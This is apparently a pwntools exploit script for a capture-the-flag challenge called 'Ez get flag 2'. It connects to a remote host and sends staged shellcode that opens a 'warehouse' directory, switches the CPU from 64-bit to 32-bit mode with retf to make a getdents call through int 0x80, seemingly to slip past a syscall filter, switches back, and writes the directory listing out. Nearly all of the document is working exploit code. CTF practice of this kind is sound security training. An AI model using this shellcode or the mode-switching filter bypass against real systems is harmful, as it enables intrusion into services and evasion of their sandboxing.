#Ez get flag 2
from pwn import *
import time

context.log_level = 'debug'
context.arch = "amd64"

e = context.binary = ELF('./challenge')
# lib = e.libc
script = """
b*main+147
c
"""

def leak_file_name():
    #r = e.process()
    #gdb.attach(r,script)
    r = remote("34.126.117.161",3000)
    shell_openat=shellcraft.amd64.pushstr("warehouse")
    
    shell_openat+=('''
        mov rsi, rsp
        xor edx, edx       
        xor r10, r10       
        mov rdi, -100       
        push SYS_openat 
        pop rax
        syscall
        
    ''')

    shellcode_read = ('''
        mov rdi, 0
        mov rdx, 0x500
        mov rsi, 0xaabb0100
        mov rax, 0
        syscall
        nop
    ''')
     
    shellcode_x86_64_to_x86 =('''
        mov rsp, 0xaabb0500
        mov DWORD PTR [rsp], 0xaabb0100
        mov DWORD PTR [rsp + 4], 0x23
        retfd
    ''')

    shellcode_getdents=('''
        mov eax, 0x8d
        mov ebx, 3
        mov ecx, 0xaabb0300
        mov edx, 0xa00
        int 0x80
    ''')
    
    shellcode_x86_to_x86_64 =('''
        mov esp, 0xaabb0600
        mov DWORD PTR [rsp], 0xaabb0200
        mov DWORD ptr [rsp + 4], 0x33
        retfd
    ''')
    
    shellcode_write = ('''
        mov rdi, 1
        mov rdx, 0xa00
        mov rsi, 0xaabb0300
        /* call write() */
        mov rax, 1
        syscall
    ''')
    
    shellcode =asm(shell_openat+shellcode_read+shellcode_x86_64_to_x86)

    # print(disasm(shellcode))
    payload=b"\x90"*321+shellcode
    pause()
    r.sendline(payload)
    
    
    payload= asm(shellcode_getdents+shellcode_x86_to_x86_64).ljust(0x100,b"\x90")+asm(shellcode_write)
    pause()
    r.sendline(payload)
    x = r.recv(0x500)
    print(x)
    with open('listdir', 'wb') as file:
        file.write(x)
    
    # r.close()
    r.interactive()

leak_file_name()
